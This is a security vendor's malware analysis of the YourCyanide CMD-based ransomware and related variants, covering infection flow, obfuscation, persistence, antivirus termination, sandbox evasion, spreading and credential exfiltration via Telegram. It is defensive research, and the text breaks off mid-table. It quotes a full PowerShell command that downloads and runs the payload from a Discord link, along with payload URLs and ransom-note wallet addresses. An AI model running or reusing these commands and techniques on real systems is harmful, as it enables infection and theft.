<div>
<p>Ransomware</p>
<h1 class="article-details__title">YourCyanide: A CMD-based Ransomware With Multiple Layers of Obfuscation </h1>
<p>The Trend Micro Threat Hunting team recently analyzed a series of CMD-based ransomware variants with a number capabilities such as stealing user information, bypassing remote desktop connections, and propagating through email and physical drives. </p>
<p>By: Ieriz Nicolle Gonzalez, Nathaniel Morales, Monte de Jesus
		
			June 02, 2022
Read time: 10 min (2706 words)
	</p>
<a class="addthis_button_compact addthis_link">
<img alt="Share" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="addthis_button_print addthis_link">
<img alt="Print" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<p>Save to Folio</p>
<a class="bs-modal" href="#" target="target" title="Subscribe">
 Subscribe
</a>
<p>The Trend Micro Threat Hunting team recently analyzed a series of CMD-based <a href="https://www.trendmicro.com/vinfo/us/security/definition/ransomware">ransomware</a> variants with a number capabilities such as stealing user information, bypassing remote desktop connections, and propagating through email and physical drives.</p>
<p>In this blog entry, we will analyze YourCyanide, the latest variant of the CMD-based ransomware family that started with GonnaCope. YourCyanide is a sophisticated ransomware that integrates PasteBin, Discord, and Microsoft document links as part of its payload download routine. YourCyanide contains multiple layers of obfuscation and takes advantage of custom environment variables and the Enable Delayed Expansion function to hide its activities. As part of its evasion strategy, YourCyanide will also pass through different files, downloading the succeeding files via Discord and Pastebin with each step before eventually downloading the main payload.</p>
<p>Note that the ransomware is still currently under development, so some portions of the routine — like the actual encryption portion — are not finalized (YourCyanide currently renames the files under specific directories, but does not encrypt anything).</p>
<figure class="image-figure">
<img alt="Figure 1. An Obfuscated batch script" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-1.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 1. An Obfuscated batch script</figcaption>
</figure>
<p>The earliest sample of this ransomware, known as GonnaCope, was found by <a href="https://twitter.com/petrovic082/status/1519230065950826497">Twitter user Petrovic</a> in April 2022. This variant possessed the ability to overwrite its victim's files — however, this was limited to the current directory in which the ransomware was being executed.</p>
<p>Upon checking the latest variant of this malware, we observed that the malware author was sending messages to all users in the compromised network notifying them of the infiltration. Along with this, another message was sent stating that "Kekware and Kekpop were just the begining" — indicating that the author was preparing a more sophisticated variant of the original ransomware.</p>
<figure class="image-figure">
<img alt="Figure 2. A message warning victims of potentially more sophisticated variants of the ransomware" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-2.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 2. A message warning victims of potentially more sophisticated variants of the ransomware</figcaption>
</figure>
<p>Table 1 shows when the additional variants of the original CMD/BAT-based ransomware were uploaded to VirusTotal.</p>
<table border="3" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr><td><p>Date earliest sample was uploaded to VirusTotal</p>
</td>
<td valign="top" width="169"><p>Ransomware sample</p>
</td>
</tr></tbody><tbody><tr><td valign="top" width="222"><p>07 Apr 2022 </p>
</td>
<td valign="top" width="169"><p>GonnaCope</p>
</td>
</tr><tr><td valign="top" width="222"><p>07 May 2022</p>
</td>
<td valign="top" width="169"><p>Kekpop</p>
</td>
</tr><tr><td valign="top" width="222"><p>11 May 2022 </p>
</td>
<td valign="top" width="169"><p>Kekware </p>
</td>
</tr><tr><td valign="top" width="222"><p>13 May 2022 </p>
</td>
<td valign="top" width="169"><p>YourCyanide</p>
</td>
</tr></tbody></table>
<p>Table 1. CMD-based ransomware samples and their date of upload to VirusTotal</p>
<h1>YourCyanide technical analysis</h1>
<h1>Infection flow</h1>
<figure class="image-figure">
<img alt=" Figure 3. YourCyanide infection routine" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-3.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption> Figure 3. YourCyanide infection routine</figcaption>
</figure>
<figure class="image-figure">
<img alt="Figure 4. Exfiltration of stolen information" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-4.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 4. Exfiltration of stolen information</figcaption>
</figure>
<h1>Arrival</h1>
<p>It initially arrives as an LNK file that contains the following PowerShell script for downloading the "YourCyanide.exe" 64-bit executable from Discord and executing it:
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('hxxps://cdn.discordapp.com/attachments/974799607894769704/975527548983341056/YourCyanide.exe', 'YourCyanide.exe')"; start YourCyanide.exe"</p>
<figure class="image-figure">
<img alt="Figure 5. LNK file containing the shellcode" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-5.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 5. LNK file containing the shellcode</figcaption>
</figure>
<p>This 64-bit executable file creates and executes a CMD file with the filename YourCyanide.cmd.</p>
<figure class="image-figure">
<img alt="Figure 6. Creating and executing YourCyanide.cmd" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-6.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 6. Creating and executing YourCyanide.cmd</figcaption>
</figure>
<p>The dropped YourCyanide.cmd file contains a script downloaded from Pastebin that is saved using the same filename (<a>YourCyanide.cmd</a>).</p>
<figure class="image-figure">
<img alt="Figure 7. Code snippets from the YourCyanide.cmd file" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-7.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 7. Code snippets from the YourCyanide.cmd file</figcaption>
</figure>
<p>The ransomware will create a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce for cleanup purposes. It then runs advpack.dll to delete the folder containing the malicious CMD file to remove traces of the downloader from the machine.</p>
<figure class="image-figure">
<img alt="Figure 8. Creating a registry key for cleanup" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-8.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 8. Creating a registry key for cleanup</figcaption>
</figure>
<h1>Analyzing YourCyanide.cmd</h1>
<p>The downloaded script file contains 10 layers of obfuscated code, with each layer being needed to deobfuscate the succeeding layer. It takes advantage of the Enable Extensions and Enable Delayed Extensions commands, causing variables within a batch file to be expanded at execution time rather than at parse time.</p>
<p>The malware uses following format for its obfuscation technique:</p>
<p>%parameter:~index of character, number of characters to take%</p>
<p>%Kesik:~19,1%, will return 1 character from the index value 19 of parameter Kesik</p>
<figure class="image-figure">
<img alt="Figure 9. Code snippets showing Enable Extensions and Enable Delayed Extensions commands" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-9.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 9. Code snippets showing Enable Extensions and Enable Delayed Extensions commands</figcaption>
</figure>
<p>Upon execution, YourCyanide sets its file attributes as hidden and as a system file, then launches five maximized Command Prompt windows.</p>
<figure class="image-figure">
<img alt="Figure 10. Launching five maximized Command Prompt windows" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-10.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 10. Launching five maximized Command Prompt windows</figcaption>
</figure>
<p>It will then try to add a user "session" to the Administrators group using the net localgroup command.</p>
<figure class="image-figure">
<img alt="Figure 11. The net localgroup command being run" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-11.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 11. The net localgroup command being run</figcaption>
</figure>
<p>It also creates an autostart mechanism for persistence by creating a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\Run and then copying itself to the Startup directory. It also disables Task Manager by modifying its registry entry.</p>
<figure class="image-figure">
<img alt="Figure 12. Code snippet showing YourCyanide creating a registry key and copying itself to the Startup directory for persistence." src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-12.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 12. Code snippet showing YourCyanide creating a registry key and copying itself to the Startup directory for persistence.</figcaption>
</figure>
<p>It then checks if %SystemDrive%\AutoExec.bat exists, and if so, it deletes the original and then copies itself and sets the file to read only, hidden, and as a system file. </p>
<p>It also avoids machines with the following usernames, some of which, according to our research, are usernames used by malware researchers and sandbox systems — implying that the malware author is noting which machines should be evaded:</p>
<ul>
<li class="rich-text-li">a.monaldo </li>
<li class="rich-text-li">George</li>
<li class="rich-text-li">george</li>
<li class="rich-text-li">help</li>
<li class="rich-text-li">karolisliucveikis </li>
<li class="rich-text-li">Soumy</li>
<li class="rich-text-li">guent</li>
</ul>
<p>After checking the username of the infected machine, it drops and executes a batch file in UserProfile\Documents\black.bat. This batch file is responsible for continuously opening the Blank Screen Saver file, which renders the machine inaccessible while the malware is running.
</p>
<figure class="image-figure">
<img alt="Figure 13. Dropping and executing the batch file" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-13.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 13. Dropping and executing the batch file</figcaption>
</figure>
<p>YourCyanide also terminates several services and security applications by concatenating variables to form the strings "net stop," "norton," "symantec," and "McAfee."</p>
<figure class="image-figure">
<img alt="Figure 14. Code snippet showing YourCyanide stopping services and security software" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-14-1.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 14. Code snippet showing YourCyanide stopping services and security software" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-14-2.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 14. Code snippet showing YourCyanide stopping services and security software" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-14-3.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 14. Code snippet showing YourCyanide stopping services and security software</figcaption>
</figure>
<p>It then swaps the mouse button using the SwapMouseButton Export function of the user32.dll file.</p>
<p>After terminating applications, it renames files from the following directories to &lt;Random&gt;.&lt;file extension&gt;.&lt;Random&gt;.cyn:</p>
<ul>
<li class="rich-text-li">%MyDesktop%</li>
<li class="rich-text-li">%MyDocuments%</li>
<li class="rich-text-li">%MyMusic%</li>
<li class="rich-text-li">%MyPictures%</li>
<li class="rich-text-li">%MyVideos%</li>
<li class="rich-text-li">%Downloads%</li>
<li> </li>
</ul>
<p>Although no actual encryption is being performed, users will still be heavily inconvenienced due to their files being renamed — especially for those with large amounts of files in these particular folders. Furthermore, since the malware is still currently under development, it’s likely that the malware authors are still finalizing the encryption portion of the routine.
</p>
<p>It then creates the following ransom notes and drops them into %MyDesktop%:</p>
<ul>
<li class="rich-text-li">YcynNote.txt</li>
<li class="rich-text-li">other.txt</li>
</ul>
<figure class="image-figure">
<img alt="Figure 15. The ransom notes dropped by YourCyanide (including the warning shown in Figure 2)" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-15-1.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 15. The ransom notes dropped by YourCyanide (including the warning shown in Figure 2)" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-15-2.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 15. The ransom notes dropped by YourCyanide (including the warning shown in Figure 2)</figcaption>
</figure>
<p>It features two instances in which it copies itself to batch files and then appends the malicious code (shown in Figure 16) to win.ini and system.ini.</p>
<figure class="image-figure">
<img alt="Figure 16. The malicious code that are appended to win.ini and system.ini" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-16-1.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 16. The malicious code that are appended to win.ini and system.ini" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-16-2.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 16. The malicious code that are appended to win.ini and system.ini</figcaption>
</figure>
<p>After performing its routine, it deletes the black.bat file in the %MyDocuments% directory, which is responsible for rendering the machine inaccessible. Deleting the file will stop the blank screen saver file from continuously opening.</p>
<figure class="image-figure">
<img alt="Figure 17. The black.bat file responsible for rendering the infected machine inaccessible" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-17.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 17. The black.bat file responsible for rendering the infected machine inaccessible</figcaption>
</figure>
<h1>Lateral movement</h1>
<p>YourCyanide is also capable of spreading via email and to different drives. It creates two VBScript files, mail.vbs and loveletter.vbs, that send an email using the following subjects (with itself as an attachment):</p>
<ul>
<li class="rich-text-li">I Have a crush on you</li>
<li class="rich-text-li">Check This Out</li>
</ul>
<p>It then copies itself to the following drives or directories:</p>
<ul>
<li class="rich-text-li">D:</li>
<li class="rich-text-li">E:</li>
<li class="rich-text-li">F:</li>
<li class="rich-text-li">G:</li>
<li class="rich-text-li">H:</li>
<li class="rich-text-li">%UserProfile%</li>
</ul>
<h1>Bypassing remote desktop connections and firewalls</h1>
<p>YourCyanide enables Remote Desktop Connection (RDP) by using the netsh commands shown in Figure 18.</p>
<figure class="image-figure">
<img alt="Figure 18. Using netsh commands for RDP connection" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-18.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 18. Using netsh commands for RDP connection</figcaption>
</figure>
<p>The ransomware opens multiple local ports by adding firewall rules for Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) connections via the netsh advfirewall function.</p>
<figure class="image-figure">
<img alt="Figure 19. Opening multiple local ports" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-19.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 19. Opening multiple local ports</figcaption>
</figure>
<p>It then downloads and executes another CMD file (ycynlog.cmd) from hxxps://pastebin[.]com/raw/2K5m42Xp.</p>
<h1>Exfiltration of stolen information</h1>
<p>The ycynlog.cmd file is responsible for the collection and exfiltration of stolen information from the compromised machine. Like the main file, it also features multiple layers of obfuscation. Upon execution, the file hides itself and creates its autostart mechanism by producing a registry key in HKLM\Software\Microsoft\Windows\CurrentVersion\Run, and by copying itself to the Startup directory.</p>
<p>The malware uses the Telegram chatbot API to exfiltrate the stolen information and sets it to variable "Webhook"</p>
<figure class="image-figure">
<img alt="Figure 20. Using the Telegram Chatbot API for data exfiltration" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-20.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 20. Using the Telegram Chatbot API for data exfiltration</figcaption>
</figure>
<p>It downloads another executable from Discord (GetToken.exe). Running this executable creates the file MyTokens.txt, which contains stolen access token data from different applications such as Chrome, Discord, and Microsoft Edge.</p>
<figure class="image-figure">
<img alt="Figure 21. Downloading GetToken.exe" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-21.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 21. Downloading GetToken.exe" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-21-2.png" style="max-width:80%;height:auto;width:auto;"/>
</figure>
<figure class="image-figure">
<img alt="Figure 21. Downloading GetToken.exe" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-21-3.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 21. Downloading GetToken.exe</figcaption>
</figure>
<p>It also collects the following machine information and stores it in userdata.txt:</p>
<ul>
<li class="rich-text-li">IP addresses</li>
<li class="rich-text-li">MAC addresses</li>
<li class="rich-text-li">CPU Information</li>
<li class="rich-text-li">Memory Size</li>
<li class="rich-text-li">Partition information</li>
<li class="rich-text-li">System specifications</li>
<li class="rich-text-li">OS product key</li>
<li class="rich-text-li">Currently running processes</li>
</ul>
<p>Both Tokens.txt and userdata.txt will then be sent via Telegram chatbot API using the curl command.</p>
<p>We also discovered that YourCyanide exfiltrates Minecraft-related credentials.</p>
<figure class="image-figure">
<img alt="Figure 22. Exfiltrating Minecraft-related credentials" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-22.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 22. Exfiltrating Minecraft-related credentials</figcaption>
</figure>
<p>Finally, it downloads another executable from Google Docs and executes it using the parameter "/stext ForME.txt". ForMe.txt will then be sent to the Telegram chatbot. While the Google Docs link is currently inaccessible, and therefore a sample can't be sourced, we noticed that it is run using the same parameter as the sample "passwords.exe," which is also used by the earlier Kekpop variant. The parameter "/stext" is employed when executing the file, which is similar to the WebBrowserPassView application used to retrieve credentials stored by various web browsers such as Internet Explorer (Version 4.0 - 10.0), Mozilla Firefox (all versions), Google Chrome, Safari, and Opera.</p>
<figure class="image-figure">
<img alt="Figuring 23. Downloading the executable from Google Docs" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-23.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figuring 23. Downloading the executable from Google Docs</figcaption>
</figure>
<p>The file created from executing passwords.exe contains saved passwords that are stored in Google Chrome.</p>
<figure class="image-figure">
<img alt="Figure 24. The file created from executing passwords.exe" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-24.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 24. The file created from executing passwords.exe</figcaption>
</figure>
<h1>Avoiding usernames</h1>
<p>Of the usernames this malware avoids, three in particular stand out. Namely: a.monaldo, karolisliucveikis, and soumy. Upon further research, we discovered that these are usernames from sandbox environments.</p>
<p><a href="https://yomi.yoroi.company/report/5fbd4c019928c63cad10393e/5fbd4c068623ad3e59d2fb0b/overview">a.monaldo</a>
</p>
<p> </p>
<p>The username of the sandbox machine used by Hunter Yomi</p>
<figure class="image-figure">
<img alt="Figure 25. Screenshot showing the a.monaldo username Image from yomi.yoroi.company" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-25.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 25. Screenshot showing the a.monaldo username Image from yomi.yoroi.company</figcaption>
</figure>
<p><a href="https://www.pcrisk.com/removal-guides/21290-vn-os-ransomware">karolisliucveikis</a></p>
<p>The username of the sandbox machine used by PCRisk</p>
<figure class="image-figure">
<img alt="Figure 26. Screenshot showing the karolisliucveikis username Image from pcrisk.com" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-26.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 26. Screenshot showing the karolisliucveikis username Image from pcrisk.com</figcaption>
</figure>
<p><a href="http://software.sonicwall.com/applications/gav/index.asp?ev=sig&amp;sigid=56043">soumy</a></p>
<figure class="image-figure">
<img alt="Figure 27. Screenshot showing the soumy username Image from sonicwall.com" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-27.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 27. Screenshot showing the soumy username Image from sonicwall.com</figcaption>
</figure>
<h1>Variant Comparison</h1>
<p>The team analyzed these CMD-based ransomwares and came up with the following table that compares each variant and their differences. One notable difference is that GonnaCope, the earliest variant, does not collect user credentials from web browsers and list of applications, and does not enable RDP connections. Furthermore, it does not execute black.bat, the file that temporarily causes the machine to become inaccessible while the malware executes its payload. We also observed that the BTC address used by GonnaCope is different from the BTC address of the succeeding variants and it contains a different ransom note format. The variants also differ in their delivery — shifting between arriving as an archive, executable files, or LNK files that drop the CMD-based ransomware. The payloads are also located in different parts of the chain, with some being found in the main CMD file, while others are found in files that are downloaded from Pastebin and Discord.</p>
<table border="3" cellpadding="1" cellspacing="0" width="100%">
<tbody><tr><td><p>Behavior</p>
</td>
<td valign="top" width="98"><p>GonnaCope</p>
</td>
<td valign="top" width="133"><p>Kekware</p>
</td>
<td valign="top" width="131"><p>Kekpop</p>
</td>
<td valign="top" width="156"><p>YourCyanide</p>
</td>
</tr></tbody><tbody><tr><td valign="top" width="105"><p>Creates auto-start mechanism</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Disables task manager</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Checks the username of the machine</p>
</td>
<td valign="top" width="98"><p>No</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Creates and executes black.bat to continuously turn on Blank Screen Saver</p>
</td>
<td valign="top" width="98"><p>No</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Stops services</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Terminates applications</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Swaps mouse buttons</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Renames files</p>
</td>
<td valign="top" width="98"><p>GonnaCope.cope
random.cope</p>
</td>
<td valign="top" width="133"><p>&lt;Random&gt;.&lt;file extension&gt;.&lt;Random&gt;.cyn</p>
</td>
<td valign="top" width="131"><p>&lt;Random&gt;.&lt;file extension&gt;.&lt;Random&gt;.kekpop</p>
</td>
<td valign="top" width="156"><p>&lt;Random&gt;.&lt;file extension&gt;.&lt;Random&gt;.cyn</p>
</td>
</tr><tr><td valign="top" width="105"><p>Gathers a list of installed applications</p>
</td>
<td valign="top" width="98"><p>No</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Collects machine information</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Collects token access data</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Collects passwords saved in web browsers</p>
</td>
<td valign="top" width="98"><p>No</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Sends an email with a copy of itself as an attachment</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Subject of sent email</p>
</td>
<td valign="top" width="98"><p>Is this you?
Here is that document you needed</p>
</td>
<td valign="top" width="133"><p>I Have a crush on you
Check This Out</p>
</td>
<td valign="top" width="131"><p>I Have a crush on you</p>
</td>
<td valign="top" width="156"><p>I Have a crush on you
Check This Out</p>
</td>
</tr><tr><td valign="top" width="105"><p>Copies itself in drives</p>
</td>
<td valign="top" width="98"><p>Yes</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Enables RDP connection</p>
</td>
<td valign="top" width="98"><p>No</p>
</td>
<td valign="top" width="133"><p>Yes</p>
</td>
<td valign="top" width="131"><p>Yes</p>
</td>
<td valign="top" width="156"><p>Yes</p>
</td>
</tr><tr><td valign="top" width="105"><p>Ransom note message</p>
</td>
<td valign="top" width="98"><p>Your files are unusable pay $100 in bitcoin to bc1qlly4puaz7pz3zmph8n2d620jc2j60qf4ve5qll to get your files back or allow it into outlook for a decryption key</p>
</td>
<td valign="top" width="133"><p>Q: What happened to my files
A: They got encrypted by kekware.
Q: how can i get them back
A: You can get them back by paying $500 in bitcoin to this btc wallet bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf.
Q: What happens if i dont pay
